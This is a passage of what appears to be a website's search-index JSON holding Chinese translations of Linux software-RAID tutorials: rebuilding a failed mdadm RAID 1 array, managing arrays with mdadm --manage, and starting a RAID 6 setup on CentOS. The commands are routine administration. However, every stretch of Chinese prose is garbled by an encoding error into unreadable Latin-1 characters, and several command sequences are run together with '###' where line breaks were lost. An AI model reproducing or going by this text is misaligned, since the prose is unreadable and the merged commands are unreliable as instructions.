å¯ä»¥ç›´æ¥ä»æœºå™¨ä¸­å–å‡ºï¼Œå¹¶å°†å…¶ä½¿ç”¨å¤‡ç”¨è®¾å¤‡æ¥å–ä»£ï¼ˆ/dev/sdd ä¸­ç±»å‹ä¸º fd çš„åˆ†åŒºæ˜¯ä»¥å‰åˆ›å»ºçš„ï¼‰: mdadm --manage /dev/md0 --add /dev/sdd1 å¹¸è¿çš„æ˜¯ï¼Œè¯¥ç³»ç»Ÿä¼šä½¿ç”¨æˆ‘ä»¬åˆšæ‰æ·»åŠ çš„ç£ç›˜è‡ªåŠ¨é‡å»ºé˜µåˆ—ã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡æ ‡è®° /dev/sdb1 ä¸º faulty æ¥è¿›è¡Œæµ‹è¯•ï¼Œä»é˜µåˆ—ä¸­å–å‡ºåï¼Œå¹¶ç¡®è®¤ tecmint.txt æ–‡ä»¶ä»ç„¶åœ¨ /mnt/raid1 æ˜¯å¯è®¿é—®çš„: mdadm --detail /dev/md0 mount | grep raid1 ls -l /mnt/raid1 | grep tecmint cat /mnt/raid1/tecmint.txt ç¡®è®¤ RAID é‡å»º ä¸Šé¢å›¾ç‰‡æ¸…æ¥šçš„æ˜¾ç¤ºï¼Œæ·»åŠ  /dev/sdd1 åˆ°é˜µåˆ—ä¸­æ¥æ›¿ä»£ /dev/sdc1ï¼Œæ•°æ®çš„é‡å»ºæ˜¯ç³»ç»Ÿè‡ªåŠ¨å®Œæˆçš„ï¼Œä¸éœ€è¦å¹²é¢„ã€‚ è™½ç„¶è¦æ±‚ä¸æ˜¯å¾ˆä¸¥æ ¼ï¼Œæœ‰ä¸€ä¸ªå¤‡ç”¨è®¾å¤‡æ˜¯ä¸ªå¥½ä¸»æ„ï¼Œè¿™æ ·æ›´æ¢æ•…éšœçš„è®¾å¤‡å°±å¯ä»¥åœ¨ç¬é—´å®Œæˆäº†ã€‚ è¦åšåˆ°è¿™ä¸€ç‚¹ï¼Œå…ˆè®©æˆ‘ä»¬é‡æ–°æ·»åŠ  /dev/sdb1 å’Œ /dev/sdc1: mdadm --manage /dev/md0 --add /dev/sdb1 mdadm --manage /dev/md0 --add /dev/sdc1 å–ä»£æ•…éšœçš„ Raid è®¾å¤‡ ä»å†—ä½™ä¸¢å¤±ä¸­æ¢å¤æ•°æ® å¦‚å‰æ‰€è¿°ï¼Œå½“ä¸€ä¸ªç£ç›˜å‘ç”Ÿæ•…éšœæ—¶ï¼Œ mdadm å°†è‡ªåŠ¨é‡å»ºæ•°æ®ã€‚ ä½†æ˜¯ï¼Œå¦‚æœé˜µåˆ—ä¸­çš„2ä¸ªç£ç›˜éƒ½æ•…éšœæ—¶ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿè®©æˆ‘ä»¬æ¥æ¨¡æ‹Ÿè¿™ç§æƒ…å†µï¼Œ é€šè¿‡æ ‡è®° /dev/sdb1 å’Œ /dev/sdd1 ä¸º faulty: umount /mnt/raid1 mdadm --manage --set-faulty /dev/md0 /dev/sdb1 mdadm --stop /dev/md0 mdadm --manage --set-faulty /dev/md0 /dev/sdd1 æ­¤æ—¶å°è¯•ä»¥åŒæ ·çš„æ–¹å¼é‡æ–°åˆ›å»ºé˜µåˆ—å°±ï¼ˆæˆ–ä½¿ç”¨ --assume-clean é€‰é¡¹ï¼‰å¯èƒ½ä¼šå¯¼è‡´æ•°æ®ä¸¢å¤±ï¼Œå› æ­¤ä¸åˆ°ä¸‡ä¸å¾—å·²ä¸è¦ä½¿ç”¨ã€‚ è®©æˆ‘ä»¬è¯•ç€ä» /dev/sdb1 æ¢å¤æ•°æ®ï¼Œ ä¾‹å¦‚ï¼Œåœ¨ä¸€ä¸ªç±»ä¼¼çš„ç£ç›˜åˆ†åŒºï¼ˆ/dev/sde1 - æ³¨æ„ï¼Œè¿™éœ€è¦ä½ æ‰§è¡Œå‰åœ¨/dev/sde ä¸Šåˆ›å»ºä¸€ä¸ª fd ç±»å‹çš„åˆ†åŒºï¼‰ä¸Šä½¿ç”¨ ddrescue : ddrescue -r 2 /dev/sdb1 /dev/sde1 æ¢å¤ Raid é˜µåˆ— è¯·æ³¨æ„ï¼Œåˆ°ç°åœ¨ä¸ºæ­¢ï¼Œæˆ‘ä»¬è¿˜æ²¡æœ‰è§¦åŠ /dev/sdb å’Œ /dev/sddï¼Œå®ƒä»¬çš„åˆ†åŒºæ˜¯ RAID é˜µåˆ—çš„ä¸€éƒ¨åˆ†ã€‚ ç°åœ¨ï¼Œè®©æˆ‘ä»¬ä½¿ç”¨ /dev/sde1 å’Œ /dev/sdf1 æ¥é‡å»ºé˜µåˆ—: mdadm --create /dev/md0 --level=mirror --raid-devices=2 /dev/sd[e-f]1 è¯·æ³¨æ„ï¼Œåœ¨çœŸå®çš„æƒ…å†µä¸‹ï¼Œä½ éœ€è¦ä½¿ç”¨ä¸åŸæ¥çš„é˜µåˆ—ä¸­ç›¸åŒçš„è®¾å¤‡åç§°ï¼Œ å³è®¾å¤‡å¤±æ•ˆåæ›¿æ¢çš„ç£ç›˜çš„åç§°åº”è¯¥æ˜¯ /dev/sdb1 å’Œ /dev/sdc1ã€‚ åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘é€‰æ‹©äº†ä½¿ç”¨é¢å¤–çš„è®¾å¤‡æ¥é‡æ–°åˆ›å»ºå…¨æ–°çš„ç£ç›˜é˜µåˆ—ï¼Œæ˜¯ä¸ºäº†é¿å…ä¸åŸæ¥çš„æ•…éšœç£ç›˜æ··æ·†ã€‚ å½“è¢«é—®åŠæ˜¯å¦ç»§ç»­å†™å…¥é˜µåˆ—æ—¶ï¼Œé”®å…¥ Yï¼Œç„¶åæŒ‰ Enterã€‚é˜µåˆ—è¢«å¯åŠ¨ï¼Œä½ ä¹Ÿå¯ä»¥æŸ¥çœ‹å®ƒçš„è¿›å±•: watch -n 1 cat /proc/mdstat å½“è¿™ä¸ªè¿‡ç¨‹å®Œæˆåï¼Œä½ å°±åº”è¯¥èƒ½å¤Ÿè®¿é—® RAID çš„æ•°æ®ï¼š ç¡®è®¤ Raid æ•°æ® æ€»ç»“ åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬å›é¡¾äº†ä» RAID æ•…éšœå’Œå†—ä½™ä¸¢å¤±ä¸­æ¢å¤æ•°æ®ã€‚ ä½†æ˜¯ï¼Œä½ è¦è®°ä½ï¼Œè¿™ç§æŠ€æœ¯æ˜¯ä¸€ç§å­˜å‚¨è§£å†³æ–¹æ¡ˆï¼Œä¸èƒ½å–ä»£å¤‡ä»½ã€‚ æœ¬æ–‡ä¸­ä»‹ç»çš„æ–¹æ³•é€‚ç”¨äºæ‰€æœ‰ RAID ä¸­ï¼Œå…¶ä¸­çš„æ¦‚å¿µæˆ‘å°†åœ¨æœ¬ç³»åˆ—çš„æœ€åä¸€ç¯‡ï¼ˆRAID ç®¡ç†ï¼‰ä¸­æ¶µç›–å®ƒã€‚ å¦‚æœä½ å¯¹æœ¬æ–‡æœ‰ä»»ä½•ç–‘é—®ï¼Œéšæ—¶ç»™æˆ‘ä»¬ä»¥è¯„è®ºçš„å½¢å¼è¯´æ˜ã€‚æˆ‘ä»¬æœŸå¾…å€¾å¬é˜ä¸‹çš„å¿ƒå£°ï¼","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-Raid-How-to-recover-and-rebuild-data-when-the-software-RAID-failure.html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-Raid-How-to-recover-and-rebuild-data-when-the-software-RAID-failure.html"},{"title":"å¦‚ä½•ä½¿ç”¨ Mdadm å·¥å…·ç®¡ç†è½¯ä»¶ RAID","text":"å‚è€ƒ:: ä½œè€…: Babin Lonston è¯‘è€…: LCTT è¯‘è€…: struggling < https://linux.cn/portal.php?mod=comment&id=6463&idtype=aid >`_ æ— è®ºä½ ä»¥å‰æœ‰æ²¡æœ‰ä½¿ç”¨ RAID é˜µåˆ—çš„ç»éªŒï¼Œ ä»¥åŠæ˜¯å¦å®Œæˆäº† æ­¤ RAID ç³»åˆ— çš„æ‰€æœ‰æ•™ç¨‹ï¼Œ ä¸€æ—¦ä½ åœ¨ Linux ä¸­ç†Ÿæ‚‰äº† mdadm --manage å‘½ä»¤çš„ä½¿ç”¨ï¼Œç®¡ç†è½¯ä»¶ RAID å°†ä¸æ˜¯å¾ˆå¤æ‚çš„ä»»åŠ¡ã€‚ åœ¨æœ¬æ•™ç¨‹ä¸­ï¼Œæˆ‘ä»¬ä¼šå†ä»‹ç»æ­¤å·¥å…·æä¾›çš„åŠŸèƒ½ï¼Œè¿™æ ·å½“ä½ éœ€è¦å®ƒï¼Œå°±å¯ä»¥æ´¾ä¸Šç”¨åœºã€‚ RAID æµ‹è¯•æ–¹æ¡ˆ åœ¨æœ¬ç³»åˆ—çš„æœ€åä¸€ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ä¸€ä¸ªç®€å•çš„ RAID 1ï¼ˆé•œåƒï¼‰é˜µåˆ—ï¼Œ å®ƒç”±ä¸¤ä¸ª 8GB çš„ç£ç›˜ï¼ˆ/dev/sdb å’Œ /dev/sdcï¼‰å’Œä¸€ä¸ªå¤‡ç”¨è®¾å¤‡ï¼ˆ/dev/sddï¼‰æ¥æ¼”ç¤ºï¼Œ ä½†åœ¨æ­¤ä½¿ç”¨çš„æ–¹æ³•ä¹Ÿé€‚ç”¨äºå…¶ä»–ç±»å‹çš„é…ç½®ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ”¾å¿ƒå»ç”¨å§ï¼ŒæŠŠè¿™ä¸ªé¡µé¢æ·»åŠ åˆ°æµè§ˆå™¨çš„ä¹¦ç­¾ï¼Œç„¶åè®©æˆ‘ä»¬å¼€å§‹å§ã€‚ äº†è§£ mdadm çš„é€‰é¡¹å’Œä½¿ç”¨æ–¹æ³• å¹¸è¿çš„æ˜¯ï¼Œmdadm æœ‰ä¸€ä¸ªå†…å»ºçš„ --help å‚æ•°æ¥å¯¹æ¯ä¸ªä¸»è¦çš„é€‰é¡¹æä¾›è¯´æ˜æ–‡æ¡£ã€‚ å› æ­¤ï¼Œè®©æˆ‘ä»¬å¼€å§‹è¾“å…¥: mdadm --manage --help å°±ä¼šä½¿æˆ‘ä»¬çœ‹åˆ° mdadm --manage èƒ½å¤Ÿæ‰§è¡Œå“ªäº›ä»»åŠ¡ï¼š ä½¿ç”¨ mdadm å·¥å…·æ¥ç®¡ç† RAID æ­£å¦‚æˆ‘ä»¬åœ¨ä¸Šé¢çš„å›¾ç‰‡çœ‹åˆ°ï¼Œç®¡ç†ä¸€ä¸ª RAID é˜µåˆ—å¯ä»¥åœ¨ä»»æ„æ—¶é—´æ‰§è¡Œä»¥ä¸‹ä»»åŠ¡ï¼š ï¼ˆé‡æ–°ï¼‰å°†è®¾å¤‡æ·»åŠ åˆ°é˜µåˆ—ä¸­ æŠŠè®¾å¤‡æ ‡è®°ä¸ºæ•…éšœ ä»é˜µåˆ—ä¸­åˆ é™¤æ•…éšœè®¾å¤‡ ä½¿ç”¨å¤‡ç”¨è®¾å¤‡æ›´æ¢æ•…éšœè®¾å¤‡ å…ˆåˆ›å»ºéƒ¨åˆ†é˜µåˆ— åœæ­¢é˜µåˆ— æ ‡è®°é˜µåˆ—ä¸º roï¼ˆåªè¯»ï¼‰æˆ– rwï¼ˆè¯»å†™ï¼‰ ä½¿ç”¨ mdadm å·¥å…·ç®¡ç† RAID è®¾å¤‡ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœç”¨æˆ·å¿½ç•¥ --manage é€‰é¡¹ï¼Œmdadm é»˜è®¤ä½¿ç”¨ç®¡ç†æ¨¡å¼ã€‚è¯·è®°ä½è¿™ä¸€ç‚¹ï¼Œä»¥é¿å…å‡ºç°æœ€åçš„æƒ…å†µã€‚ ä¸Šå›¾ä¸­çš„é«˜äº®æ–‡æœ¬æ˜¾ç¤ºäº†ç®¡ç† RAID çš„åŸºæœ¬è¯­æ³•: mdadm --manage RAID options devices è®©æˆ‘ä»¬æ¥æ¼”ç¤ºå‡ ä¸ªä¾‹å­ã€‚ ä¾‹1ï¼šä¸º RAID é˜µåˆ—æ·»åŠ è®¾å¤‡ ä½ é€šå¸¸ä¼šæ·»åŠ æ–°è®¾å¤‡æ¥æ›´æ¢æ•…éšœçš„è®¾å¤‡ï¼Œæˆ–è€…ä½¿ç”¨ç©ºé—²çš„åˆ†åŒºä»¥ä¾¿åœ¨å‡ºç°æ•…éšœæ—¶èƒ½åŠæ—¶æ›¿æ¢: mdadm --manage /dev/md0 --add /dev/sdd1 æ·»åŠ è®¾å¤‡åˆ° Raid é˜µåˆ— ä¾‹2ï¼šæŠŠä¸€ä¸ª RAID è®¾å¤‡æ ‡è®°ä¸ºæ•…éšœå¹¶ä»é˜µåˆ—ä¸­ç§»é™¤ åœ¨ä»é€»è¾‘é˜µåˆ—ä¸­åˆ é™¤è¯¥è®¾å¤‡å‰ï¼Œè¿™æ˜¯å¼ºåˆ¶æ€§çš„æ­¥éª¤ï¼Œ ç„¶åæ‰èƒ½ä»æœºå™¨ä¸­å–å‡ºå®ƒ - æ³¨æ„é¡ºåºï¼ˆå¦‚æœå¼„é”™äº†è¿™äº›æ­¥éª¤ï¼Œæœ€ç»ˆå¯èƒ½ä¼šé€ æˆå®é™…è®¾å¤‡çš„æŸå®³ï¼‰: mdadm --manage /dev/md0 --fail /dev/sdb1 è¯·æ³¨æ„åœ¨å‰é¢çš„ä¾‹å­ä¸­ï¼ŒçŸ¥é“å¦‚ä½•æ·»åŠ å¤‡ç”¨è®¾å¤‡æ¥è‡ªåŠ¨æ›´æ¢å‡ºç°æ•…éšœçš„ç£ç›˜ã€‚ åœ¨æ­¤ä¹‹åï¼Œ æ¢å¤å’Œé‡å»º raid æ•°æ® å°±å¼€å§‹äº†ï¼š æ¢å¤å’Œé‡å»º raid æ•°æ® ä¸€æ—¦è®¾å¤‡å·²è¢«æ‰‹åŠ¨æ ‡è®°ä¸ºæ•…éšœï¼Œä½ å°±å¯ä»¥å®‰å…¨åœ°ä»é˜µåˆ—ä¸­åˆ é™¤å®ƒ: mdadm --manage /dev/md0 --remove /dev/sdb1 ä¾‹3ï¼šé‡æ–°æ·»åŠ è®¾å¤‡ï¼Œæ¥æ›¿ä»£é˜µåˆ—ä¸­å·²ç»ç§»é™¤çš„è®¾å¤‡ åˆ°ç°åœ¨ä¸ºæ­¢ï¼Œæˆ‘ä»¬æœ‰ä¸€ä¸ªå·¥ä½œçš„ RAID 1 é˜µåˆ—ï¼Œ å®ƒåŒ…å«äº†2ä¸ªæ´»åŠ¨çš„è®¾å¤‡ï¼š/dev/sdc1 å’Œ /dev/sdd1ã€‚ ç°åœ¨è®©æˆ‘ä»¬è¯•è¯•é‡æ–°æ·»åŠ  /dev/sdb1 åˆ°/dev/md0: mdadm --manage /dev/md0 --re-add /dev/sdb1 æˆ‘ä»¬ä¼šç¢°åˆ°ä¸€ä¸ªé”™è¯¯: mdadm: --re-add for /dev/sdb1 to /dev/md0 is not possible å› ä¸ºé˜µåˆ—ä¸­çš„ç£ç›˜å·²ç»è¾¾åˆ°äº†æœ€å¤§çš„æ•°é‡ã€‚ å› æ­¤ï¼Œæˆ‘ä»¬æœ‰ä¸¤ä¸ªé€‰æ‹©: aï¼‰å°† /dev/sdb1 æ·»åŠ ä¸ºå¤‡ç”¨çš„ï¼Œå¦‚ä¾‹1ï¼› bï¼‰ä»é˜µåˆ—ä¸­åˆ é™¤ /dev/sdd1 ç„¶åé‡æ–°æ·»åŠ  /dev/sdb1ã€‚ æˆ‘ä»¬é€‰æ‹©é€‰é¡¹ bï¼‰ï¼Œå…ˆåœæ­¢é˜µåˆ—ç„¶åé‡æ–°å¯åŠ¨: mdadm --stop /dev/md0### mdadm --assemble /dev/md0 /dev/sdb1 /dev/sdc1 å¦‚æœä¸Šé¢çš„å‘½ä»¤ä¸èƒ½æˆåŠŸæ·»åŠ  /dev/sdb1 åˆ°é˜µåˆ—ä¸­ï¼Œä½¿ç”¨ä¾‹1ä¸­çš„å‘½ä»¤æ¥å®Œæˆã€‚ mdadm èƒ½æ£€æµ‹åˆ°æ–°æ·»åŠ çš„è®¾å¤‡å¹¶å°†å…¶ä½œä¸ºå¤‡ç”¨è®¾å¤‡ï¼Œå½“æ·»åŠ å®Œæˆåå®ƒä¼šå¼€å§‹é‡å»ºæ•°æ®ï¼Œ å®ƒä¹Ÿè¢«è®¤ä¸ºæ˜¯ RAID ä¸­çš„æ´»åŠ¨è®¾å¤‡ï¼š é‡å»º Raid çš„çŠ¶æ€ ä¾‹4ï¼šä½¿ç”¨ç‰¹å®šç£ç›˜æ›´æ¢ RAID è®¾å¤‡ åœ¨é˜µåˆ—ä¸­ä½¿ç”¨å¤‡ç”¨ç£ç›˜æ›´æ¢ç£ç›˜å¾ˆç®€å•: mdadm --manage /dev/md0 --replace /dev/sdb1 --with /dev/sdd1 æ›´æ¢ Raid è®¾å¤‡ è¿™ä¼šå¯¼è‡´ --replace æŒ‡å®šçš„è®¾å¤‡è¢«æ ‡è®°ä¸ºæ•…éšœï¼Œè€Œ --with æŒ‡å®šçš„è®¾å¤‡æ·»åŠ åˆ° RAID ä¸­æ¥æ›¿ä»£å®ƒï¼š æ£€æŸ¥ Raid é‡å»ºçŠ¶æ€ ä¾‹5ï¼šæ ‡è®° RAID é˜µåˆ—ä¸º ro æˆ– rw åˆ›å»ºé˜µåˆ—åï¼Œä½ å¿…é¡»åœ¨å®ƒä¸Šé¢åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿå¹¶å°†å…¶æŒ‚è½½åˆ°ä¸€ä¸ªç›®å½•ä¸‹æ‰èƒ½ä½¿ç”¨å®ƒã€‚ ä½ å¯èƒ½ä¸çŸ¥é“ï¼ŒRAID ä¹Ÿå¯ä»¥è¢«è®¾ç½®ä¸º roï¼Œä½¿å…¶åªè¯»ï¼›æˆ–è€…è®¾ç½®ä¸º rwï¼Œå°±å¯ä»¥åŒæ—¶å†™å…¥äº†ã€‚ è¦æ ‡è®°è¯¥è®¾å¤‡ä¸º roï¼Œé¦–å…ˆéœ€è¦å°†å…¶å¸è½½: umount /mnt/raid1### mdadm --manage /dev/md0 --readonly### mount /mnt/raid1### touch /mnt/raid1/test1 åœ¨ RAID é˜µåˆ—ä¸Šè®¾ç½®æƒé™ è¦é…ç½®é˜µåˆ—å…è®¸å†™å…¥æ“ä½œéœ€è¦ä½¿ç”¨ --readwrite é€‰é¡¹ã€‚è¯·æ³¨æ„ï¼Œåœ¨è®¾ç½® rw æ ‡å¿—å‰ï¼Œä½ éœ€è¦å…ˆå¸è½½è®¾å¤‡å¹¶åœæ­¢å®ƒ: umount /mnt/raid1### mdadm --manage /dev/md0 --stop### mdadm --assemble /dev/md0 /dev/sdc1 /dev/sdd1### mdadm --manage /dev/md0 --readwrite### touch /mnt/raid1/test2 é…ç½® Raid å…è®¸è¯»å†™æ“ä½œ æ€»ç»“ åœ¨æœ¬ç³»åˆ—ä¸­ï¼Œæˆ‘ä»¬å·²ç»è§£é‡Šäº†å¦‚ä½•å»ºç«‹ä¸€ä¸ªåœ¨ä¼ä¸šç¯å¢ƒä¸­ä½¿ç”¨çš„è½¯ä»¶ RAID é˜µåˆ—ã€‚ å¦‚æœä½ æŒ‰ç…§è¿™äº›æ–‡ç« æ‰€æä¾›çš„ä¾‹å­è¿›è¡Œé…ç½®ï¼Œåœ¨ Linux ä¸­ä½ ä¼šå……åˆ†é¢†ä¼šåˆ°è½¯ä»¶ RAID çš„ä»·å€¼ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-Raid-How-to-use-MDADM-tool-management-software-RAID.html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-Raid-How-to-use-MDADM-tool-management-software-RAID.html"},{"title":"å®‰è£… RAID 6 (æ¡å¸¦åŒ–åŒåˆ†å¸ƒå¼å¥‡å¶æ ¡éªŒ)","text":"å‚è€ƒ:: ä½œè€…: Babin Lonston è¯‘è€…: LCTT è¯‘è€…: struggling < https://linux.cn/portal.php?mod=comment&id=6121&idtype=aid >`_ RAID 6 æ˜¯ RAID 5 çš„å‡çº§ç‰ˆï¼Œå®ƒæœ‰ä¸¤ä¸ªåˆ†å¸ƒå¼å¥‡å¶æ ¡éªŒï¼Œå³ä½¿ä¸¤ä¸ªç£ç›˜å‘ç”Ÿæ•…éšœåä¾ç„¶æœ‰å®¹é”™èƒ½åŠ›ã€‚ åœ¨ä¸¤ä¸ªç£ç›˜åŒæ—¶å‘ç”Ÿæ•…éšœæ—¶ï¼Œç³»ç»Ÿçš„å…³é”®ä»»åŠ¡ä»ç„¶èƒ½è¿è¡Œã€‚ å®ƒä¸ RAID 5 ç›¸ä¼¼ï¼Œä½†æ€§èƒ½æ›´å¥å£®ï¼Œå› ä¸ºå®ƒå¤šç”¨äº†ä¸€ä¸ªç£ç›˜æ¥è¿›è¡Œå¥‡å¶æ ¡éªŒã€‚ åœ¨ä¹‹å‰çš„æ–‡ç« ä¸­ï¼Œæˆ‘ä»¬å·²ç»åœ¨ RAID 5 çœ‹äº†åˆ†å¸ƒå¼å¥‡å¶æ ¡éªŒï¼Œä½†åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬å°†çœ‹åˆ°çš„æ˜¯ RAID 6 åŒåˆ†å¸ƒå¼å¥‡å¶æ ¡éªŒã€‚ ä¸è¦æœŸæœ›æ¯”å…¶ä»– RAID æœ‰æ›´å¥½çš„æ€§èƒ½ï¼Œé™¤éä½ ä¹Ÿå®‰è£…äº†ä¸€ä¸ªä¸“ç”¨çš„ RAID æ§åˆ¶å™¨ã€‚ åœ¨ RAID 6 ä¸­ï¼Œå³ä½¿æˆ‘ä»¬å¤±å»äº†2ä¸ªç£ç›˜ï¼Œæˆ‘ä»¬ä»å¯ä»¥é€šè¿‡æ›´æ¢ç£ç›˜ï¼Œä»æ ¡éªŒä¸­æ„å»ºæ•°æ®ï¼Œç„¶åå–å›æ•°æ®ã€‚ åœ¨ Linux ä¸­å®‰è£… RAID 6 è¦å»ºç«‹ä¸€ä¸ª RAID 6ï¼Œä¸€ç»„æœ€å°‘éœ€è¦4ä¸ªç£ç›˜ã€‚RAID 6 ç”šè‡³åœ¨æœ‰äº›ç»„ä¸­ä¼šæœ‰æ›´å¤šç£ç›˜ï¼Œ è¿™æ ·å°†å¤šä¸ªç¡¬ç›˜æ†åœ¨ä¸€èµ·ï¼Œå½“è¯»å–æ•°æ®æ—¶ï¼Œå®ƒä¼šåŒæ—¶ä»æ‰€æœ‰ç£ç›˜è¯»å–ï¼Œ æ‰€ä»¥è¯»å–é€Ÿåº¦ä¼šæ›´å¿«ï¼Œå½“å†™æ•°æ®æ—¶ï¼Œå› ä¸ºå®ƒè¦å°†æ•°æ®å†™åœ¨æ¡å¸¦åŒ–çš„å¤šä¸ªç£ç›˜ä¸Šï¼Œæ‰€ä»¥æ€§èƒ½ä¼šè¾ƒå·®ã€‚ ç°åœ¨ï¼Œå¾ˆå¤šäººéƒ½åœ¨è®¨è®ºä¸ºä»€ä¹ˆæˆ‘ä»¬éœ€è¦ä½¿ç”¨ RAID 6ï¼Œå®ƒçš„æ€§èƒ½å’Œå…¶ä»– RAID ç›¸æ¯”å¹¶ä¸å¤ªå¥½ã€‚ æå‡ºè¿™ä¸ªé—®é¢˜é¦–å…ˆéœ€è¦çŸ¥é“çš„æ˜¯ï¼Œå¦‚æœéœ€è¦é«˜å®¹é”™æ€§å°±é€‰æ‹© RAID 6ã€‚ åœ¨æ¯ä¸€ä¸ªç”¨äºæ•°æ®åº“çš„é«˜å¯ç”¨æ€§è¦æ±‚è¾ƒé«˜çš„ç¯å¢ƒä¸­ï¼Œ ä»–ä»¬éœ€è¦ RAID 6 å› ä¸ºæ•°æ®åº“æ˜¯æœ€é‡è¦ï¼Œæ— è®ºèŠ±è´¹å¤šå°‘éƒ½éœ€è¦ä¿æŠ¤å…¶å®‰å…¨ï¼Œå®ƒåœ¨è§†é¢‘æµç¯å¢ƒä¸­ä¹Ÿæ˜¯éå¸¸æœ‰ç”¨çš„ã€‚ RAID 6 çš„çš„ä¼˜ç‚¹å’Œç¼ºç‚¹ æ€§èƒ½ä¸é”™ã€‚ RAID 6 æ¯”è¾ƒæ˜‚è´µï¼Œå› ä¸ºå®ƒè¦æ±‚ä¸¤ä¸ªç‹¬ç«‹çš„ç£ç›˜ç”¨äºå¥‡å¶æ ¡éªŒåŠŸèƒ½ã€‚ å°†å¤±å»ä¸¤ä¸ªç£ç›˜çš„å®¹é‡æ¥ä¿å­˜å¥‡å¶æ ¡éªŒä¿¡æ¯ï¼ˆåŒå¥‡å¶æ ¡éªŒï¼‰ã€‚ å³ä½¿ä¸¤ä¸ªç£ç›˜æŸåï¼Œæ•°æ®ä¹Ÿä¸ä¼šä¸¢å¤±ã€‚æˆ‘ä»¬å¯ä»¥åœ¨æ›´æ¢æŸåçš„ç£ç›˜åä»æ ¡éªŒä¸­é‡å»ºæ•°æ®ã€‚ è¯»æ€§èƒ½æ¯” RAID 5 æ›´å¥½ï¼Œå› ä¸ºå®ƒä»å¤šä¸ªç£ç›˜è¯»å–ï¼Œä½†å¯¹äºæ²¡æœ‰ä¸“ç”¨çš„ RAID æ§åˆ¶å™¨çš„è®¾å¤‡å†™æ€§èƒ½å°†éå¸¸å·®ã€‚ è¦æ±‚ è¦åˆ›å»ºä¸€ä¸ª RAID 6 æœ€å°‘éœ€è¦4ä¸ªç£ç›˜ã€‚ ä½ ä¹Ÿå¯ä»¥æ·»åŠ æ›´å¤šçš„ç£ç›˜ï¼Œä½†ä½ å¿…é¡»æœ‰ä¸“ç”¨çš„ RAID æ§åˆ¶å™¨ã€‚ ä½¿ç”¨è½¯ä»¶ RAID æˆ‘ä»¬åœ¨ RAID 6 ä¸­ä¸ä¼šå¾—åˆ°æ›´å¥½çš„æ€§èƒ½ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€ä¸ªç‰©ç† RAID æ§åˆ¶å™¨ã€‚ å¦‚æœä½ æ–°æ¥è§¦ RAID è®¾ç½®ï¼Œæˆ‘ä»¬å»ºè®®å…ˆçœ‹å®Œä»¥ä¸‹ RAID æ–‡ç« ã€‚ åŸæ–‡: ä»‹ç» RAID çš„çº§åˆ«å’Œæ¦‚å¿µ ä½¿ç”¨ mdadm å·¥å…·åˆ›å»ºè½¯ä»¶ RAID 0 ï¼ˆæ¡å¸¦åŒ–ï¼‰ ç”¨ä¸¤å—ç£ç›˜åˆ›å»º RAID 1ï¼ˆé•œåƒï¼‰ åˆ›å»º RAID 5ï¼ˆæ¡å¸¦åŒ–ä¸åˆ†å¸ƒå¼å¥‡å¶æ ¡éªŒï¼‰ æˆ‘çš„æœåŠ¡å™¨è®¾ç½®: æ“ä½œç³»ç»Ÿ : CentOS 6.5 Final IP åœ°å€ : 192.168.0.228 ä¸»æœºå : rd6.tecmintlocal.com ç£ç›˜ 1 [20GB] : /dev/sdb ç£ç›˜ 2 [20GB] : /dev/sdc ç£ç›˜ 3 [20GB] : /dev/sdd ç£ç›˜ 4 [20GB] : /dev/sde è¿™æ˜¯9ç¯‡ç³»åˆ—æ•™ç¨‹çš„ç¬¬5éƒ¨åˆ†ï¼Œ åœ¨è¿™é‡Œæˆ‘ä»¬å°†çœ‹åˆ°å¦‚ä½•åœ¨ Linux ç³»ç»Ÿæˆ–è€…æœåŠ¡å™¨ä¸Šä½¿ç”¨å››ä¸ª 20GB çš„ç£ç›˜ï¼ˆåä¸º /dev/sdbã€ /dev/sdcã€ /dev/sdd å’Œ /dev/sdeï¼‰ åˆ›å»ºå’Œè®¾ç½®è½¯ä»¶ RAID 6 ï¼ˆæ¡å¸¦åŒ–åŒåˆ†å¸ƒå¼å¥‡å¶æ ¡éªŒï¼‰ã€‚ ç¬¬1æ­¥ï¼šå®‰è£… mdadm å·¥å…·ï¼Œå¹¶æ£€æŸ¥ç£ç›˜ å¦‚æœä½ æŒ‰ç…§æˆ‘ä»¬æœ€è¿›çš„ä¸¤ç¯‡ RAID æ–‡ç« ï¼ˆç¬¬2ç¯‡å’Œç¬¬3ç¯‡ï¼‰ï¼Œæˆ‘ä»¬å·²ç»å±•ç¤ºäº†å¦‚ä½•å®‰è£… mdadm å·¥å…·ã€‚ å¦‚æœä½ ç›´æ¥çœ‹çš„è¿™ç¯‡æ–‡ç« ï¼Œæˆ‘ä»¬å…ˆæ¥è§£é‡Šä¸‹åœ¨ Linux ç³»ç»Ÿä¸­å¦‚ä½•ä½¿ç”¨ mdadm å·¥å…·æ¥åˆ›å»ºå’Œç®¡ç† RAIDï¼Œ é¦–å…ˆæ ¹æ®ä½ çš„ Linux å‘è¡Œç‰ˆä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥å®‰è£…: yum install mdadm # [åœ¨ RedHat ç³»ç»Ÿ] apt-get install mdadm # [åœ¨ Debain ç³»ç»Ÿ] å®‰è£…è¯¥å·¥å…·åï¼Œç„¶åæ¥éªŒè¯æ‰€éœ€çš„å››ä¸ªç£ç›˜ï¼Œæˆ‘ä»¬å°†ä¼šä½¿ç”¨ä¸‹é¢çš„ fdisk å‘½ä»¤æ¥æ£€æŸ¥ç”¨äºåˆ›å»º RAID çš„ç£ç›˜: fdisk -l | grep sd åœ¨ Linux ä¸­æ£€æŸ¥ç£ç›˜ åœ¨åˆ›å»º RAID 